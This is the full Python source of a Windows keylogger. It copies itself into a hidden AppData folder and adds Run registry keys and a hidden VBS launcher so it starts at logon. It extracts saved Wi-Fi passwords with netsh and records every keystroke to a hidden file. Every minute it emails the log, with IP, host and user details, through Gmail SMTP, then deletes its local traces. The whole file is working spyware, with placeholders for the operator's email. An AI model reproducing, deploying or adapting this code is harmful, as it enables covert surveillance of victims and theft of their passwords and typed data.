#!/usr/bin/env python
# -*- coding: utf-8 -*-


import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
import os
import urllib.request
from json import load
import datetime
import platform
import subprocess
import sys
import time
import getpass
import shutil
import base64

if os.path.exists(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'):
     
     pass 
else: 
    if not os.path.exists(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'):
         #pass
          try:               
              copy_path_new= shutil.copytree(os.path.abspath('.'),os.environ["appdata"] +'\\FVHost' )                    
              copy_path = os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'
              subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v vshost /t REG_SZ /d "' + copy_path + '"', shell=True)
              subprocess.Popen(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe',shell=True)
              ospid = os.getpid()
              commandpid  = 'taskkill /f /pid '+str(ospid)
              subprocess.check_output (commandpid,shell=True)
              exit()
          except FileExistsError:
                 pass

if os.path.exists(os.environ["appdata"] +'\\'+'FVHost'+os.path.basename(__file__)):
    pass
else:
    try:
        path = os.getcwd()+'\\'+os.path.basename(__file__)
        newpath = os.mkdir(os.environ["appdata"]+'\\'+'FVHost')          
        copy_path_new= shutil.copy(path,str(os.environ["appdata"])+'\\'+'FVHost'+'\\')
        with open(str(os.environ["appdata"])+'\\'+'FVHost'+'\\'+'runcmd.bat','w')as filebat:
            filebat.write(str(os.environ['Home'])+'\\appdata\\local\\Programs\\Python\\Python37\\'+'pythonw.exe  '+\
                        os.environ["appdata"]+'\\'+'FVHost\\'+str(os.path.basename(__file__)))
        with open(str(os.environ["appdata"])+'\\'+'FVHost'+'\\'+'autorun.vbs','w')as runtime:
            runtime.write('Set WshShell = CreateObject("WScript.Shell")'+'\n'+'WshShell.Run chr(34) & '+'"'+\
                          os.environ["appdata"]+'\\'+'FVHost\\'+'runcmd.bat " & Chr(34), 0'\
                          +"\n"+"Set WshShell = Nothing"+'\n')
        stratup_reg = str(os.environ["appdata"])+'\\'+'FVHost'+'\\'+'autorun.vbs'   
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Pythow /t REG_SZ /d "' +stratup_reg+ '"',shell=True )
    except FileExistsError:
           pass

try:
    public_ip  = urllib.request.urlopen('http://api.ipify.org').read().decode('utf8')
except Exception:      
    public_ip = 'None'
try:    
     host_name  = socket.gethostname()
     host_ip    = socket.gethostbyname(host_name)
except socket.gaierror: 
    pass
os_name    = platform.system()
os_release = platform.release()
                                         
username = getpass.getuser()  
if os.path.exists(os.environ["appdata"]+'\\VHost') :    
         os.remove(os.environ["appdata"]+'\\VHost')
else:
     pass
try:
           
       interface = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],shell=True).decode('utf-8').split('\n')      
       profiles = [profilelist.split(":")[1][1:-1] for profilelist in interface if "All User Profile" in profilelist]
       for profilelist in profiles:  
               results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profilelist, 
                        'key=clear'],shell=True).decode('utf-8').split('\n')
               results = [result.split(":")[1][1:-1] for result in results if "Key Content" in result]
               with open (os.environ["appdata"]+'\\network','a')as file_1:
                  file_2 = file_1.write("{:<}\n{:<}".format(profilelist,results[0])+'\n')
               with open (os.environ["appdata"]+'\\network','r')as file_2:
                 file_2 =file_2.readlines()
                 
      
       try:
            ssid1       =   file_2[0]
            password1   =   file_2[1]
            ssid2       =   file_2[2]
            password2   =   file_2[3]
            ssid3       =   file_2[4]
            password3   =   file_2[5]
       except IndexError:
                  try:
                       ssid1       =   file_2[0]
                       password1   =   file_2[1]
                       ssid2       =    file_2[2]
                       password2   =    file_2[3]
                       ssid3       =   'None'+'\n'
                       password3   =   'None'+'\n'
                  except IndexError :
                               try:
                                    ssid1      =  file_2[0]
                                    password1  =  file_2[1]
                                    ssid2      =  'None'+'\n'
                                    password2  =  'None'+'\n'
                                    ssid3      =  'None'+'\n'
                                    password3  =  'None'+'\n'
                               except IndexError :
                                            pass
except subprocess.CalledProcessError:
           ssid1       = 'None'+'\n'
           password1   = 'None'+'\n'
           ssid2       = 'None'+'\n'
           password2   = 'None'+'\n'
           ssid3       = 'None'+'\n'
           password3   = 'None'+'\n'

print_pub           =   'Public Ip              ..........| '+str(public_ip)
print_local_ip      =   'Local Ip               ..........| '+str(host_ip)
print_hostname      =   'Host Name              ..........| '+str(host_name)
print_os_name       =   'OS Name                ..........| '+str(os_name)
print_os_re         =   'OS Release             ..........| '+str(os_release)
print_username      =   'User Name              ..........| '+str(username)
print_WIFI          =   '='*20+'\n'+'Wifi Information:-'+'\n'+'='*20+'\n'
print_SSID          =   ' Interface Wi-Fi       ..........| '+str(ssid1)
print_password      =   'Security key           ..........| '+str(password1)
print2SSID          =   'Interface Wi-Fi        ..........| '+str(ssid2)
print2password      =   'Security key           ..........| '+str(password2)
print3SSID          =   'Interface Wi-Fi        ..........| '+str(ssid3)
print3password      =   'Security key           ..........| '+str(password3)
print_line          =   '='*40
print_info          =   'Wifi Info              .........| No WiFi InterFace Found'

if os.path.exists(os.environ["appdata"]+'\\VHost'):
        os.remove(os.environ["appdata"]+'\\VHost')

list_keys= str([
                'up','Key.esc','Key.caps_lock','Key.tab','Key.ctrl_r','Key.caps_lock','Key.num_lock',
                'Key.alt_r','Key.left','Key.up','Key.down','Key.backspace','Key.right','Key.shift_r',
                'Key.ctrl','Key.shift','Key.f1','Key.f2','Key.f3','Key.f4','Key.ctrl_l',
                'Key.f5','Key.f6','Key.f7','Key.f8','Key.page_up','Key.home' ,'Key.page_down',
                'Key.f9','Key.f10','Key.f11','Key.f12','Key.delete','None','Key.insert','Key.end'
                 ])

class Keylogger:

        def __init__(self,time_interval ):
            
                 global list_keys
                 global print_pub
                 global print_local_ip
                 global print_os_name
                 global print_os_re
                 global print_line
                 global host_name
                 global print_SSID
                 global print_password
                 global print_WIFI
                 global print2SSID
                 global print2password
                 global print3SSID
                 global print3password
                 global ptrint_info
                 global print_username
                 self.caps = False
                 self.time_count = time_interval
                  
        def ADD_LOG_KEY(self,string):
            self.log = self.log + string
        def KEY_PRESS_KEYBOARD(self,Key):
             try:
                self.press_Key = str(Key.char)
                
             except AttributeError:
                if str(Key) in list_keys :
                       self.press_Key = ""
                if Key == Key.space:
                       self.press_Key = " "
                if Key == Key.enter:
                       self.press_Key = "\n"  
                if Key ==Key.backspace:
                           with open(os.environ["appdata"]+'\\VHost','r',encoding="utf-8") as log :
                                log_file=log.read()
                                log_cut = log_file[0:-1]
                           with open(os.environ["appdata"]+'\\VHost','w',encoding="utf-8") as log :      
                                 log_write = log.write(log_cut)
                if Key ==Key.caps_lock:
                     if not self.caps:
                         self.caps = True
                     else:
                         self.caps = False                                   
                else:
                    self.press_Key = " " + str(Key) +" "
                    if str(Key) in list_keys:
                       self.press_Key = ""
                    if Key == Key.space:
                       self.press_Key = " "
                    if Key == Key.enter:
                       self.press_Key = "\n" 
                  #  if Key ==Key.backspace:
                  #         with open(os.environ["appdata"]+'\\VHost','r',encoding="utf-8") as log :
                  #              log_file=log.read()
                  #              log_cut = log_file[0:-1]
                  #         with open(os.environ["appdata"]+'\\VHost','w',encoding="utf-8") as log :      
                  #               log_write = log.write(log_cut)
                    if Key ==Key.caps_lock:
                        if not self.caps:
                           self.caps = True
                        else:
                           self.caps = False
             if self.caps :
                    self.ADD_LOG_KEY(self.press_Key.upper())
                    with open (os.environ["appdata"]+'\\VHost','a',encoding="utf-8")as file0:
                      file1 =file0.write(self.press_Key.upper())
             else:
                self.ADD_LOG_KEY(self.press_Key)
                with open (os.environ["appdata"]+'\\VHost','a',encoding="utf-8")as file0:
                   file1 =file0.write(self.press_Key)
                                      
        def START_SEND_ANDTIME(self):
             self.SEND_LOG_EMAILl()
             self.log = " "
             timer = threading.Timer(self.time_count , self.START_SEND_ANDTIME)
             timer.start()
             self.time_date  = now = datetime.datetime.now()
             self.print_time          =   'Starting Time          ..........| '+str(self.time_date)
             if 'None'in ssid1 and  'None'in password1 and 'None'in ssid2\
                        and  'None' in password2 and 'None' in  ssid3 and 'None' in password3:
                            with open (os.environ["appdata"]+'\\VHost','w',encoding="utf-8")as file0:
                                  file0.write('\n'+'KEYLOGGER REPORT '+'\n'+"="*30+'\n'+print_pub+'\n'+print_local_ip\
                                  +'\n'+print_hostname+'\n'+print_os_name+'\n'+print_os_re+'\n'+print_username+'\n'+print_WIFI+print_info+'\n'+"="*30\
                                  +'\n'+'Keylogger Start'+'\n'+"="*30+'\n'+print_time+'\n'\
                                  +print_line+'\n')
             else:            
                    with open (os.environ["appdata"]+'\\VHost','w',encoding="utf-8")as file0:
                         file0.write('\n'+'KEYLOGGER REPORT '+'\n'+"="*30+'\n'+print_pub+'\n'+print_local_ip\
                         +'\n'+print_hostname+'\n'+print_os_name+'\n'+print_os_re+'\n'+print_username+'\n'+print_WIFI+print_SSID+print_password\
                         +print2SSID+print2password+print3SSID+print3password+"="*30+'\n'+'Keylooger Start'+'\n'+"="*30+'\n'+print_time+'\n'\
                         +print_line+'\n')                             
      
          
        def SEND_LOG_EMAILl(self):
            try:
                      msg = MIMEMultipart()
                      msg['From'] ='jacstory'
                      msg['To'] ='jacstory'
                      msg['Subject'] = "jaclogger has started ".upper()
                      socket_id= socket.gethostname()
                      body =socket.gethostname()+'.txt'.strip()
                      msg.attach(MIMEText(body,'plain'))    
                      if os.path.exists(os.environ["appdata"]+'\\VHost'):
                              attachment= open (os.environ["appdata"]+'\\VHost','rb')
                              filename =body
                              part = MIMEBase('application','octect-stream')
                              part.set_payload((attachment).read())
                              encoders.encode_base64(part)
                              part.add_header('content-disposition','attachment;filename='+str(filename))
                              msg.attach(part)
                              text = msg.as_string()
                              SERVER = smtplib.SMTP('smtp.gmail.com',587)
                              SERVER.ehlo()
                              SERVER.starttls()
                              SERVER.ehlo()
                              SERVER.login(base64.b64decode(self.Ecode).decode("utf-8") ,base64.b64decode(self.Scode).decode("utf-8") )
                              SERVER.sendmail(base64.b64decode(self.Ecode).decode("utf-8"),base64.b64decode(self.Ecode).decode("utf-8") , text)
                              attachment.close()
                              SERVER.close()
                      if os.path.exists(os.environ["appdata"]+'\\VHost'):
                             os.remove(os.environ["appdata"]+'\\VHost')
                      if os.path.exists(os.environ["appdata"]+'\\network'):
                             os.remove(os.environ["appdata"]+'\\network')
            except smtplib.SMTPAuthenticationError:
                      pass
        def GO_START(self):
            import os
            try:
              import pynput.keyboard
            except ImportError:       
                  try:                     
                        environ  = os.environ['Home']
                        path1    = '\\appdata\\local\\Programs\\Python\\Python37\\'
                        path2    = environ +path1
                        goenv    = os.chdir(path2)
                        command  = 'python.exe -m pip install --upgrade pip  > nul 2>&1'
                        subprocess.check_output (command,shell=True)
                        path3 = '\\Scripts'
                        path4 = path2+path3
                        go = os.chdir(path4)
                        command1='pip.exe install pynput  > nul 2>&1'
                        subprocess.check_output (command1,shell=True)                        
                  except Exception:
                         pass                        
            import pynput.keyboard    #####    pip install pynput==1.6.8  
            self.Ecode  = 'YWRkeW91ckBnbWFpbC5jb20NCg=='             # add your email address encode base64
            self.Scode  = 'YWRkeW91ckBnbWFpbC5jb20NCg=='             #add your password encode base64 
            Keyboard_listener = pynput.keyboard.Listener(on_press=self.KEY_PRESS_KEYBOARD)
            with Keyboard_listener:
                self.START_SEND_ANDTIME()
                Keyboard_listener.join()
                
if __name__=='__main__':
  
   Keylogger = Keylogger(60) # set the time by seconds
   Keylogger.GO_START()            
                        
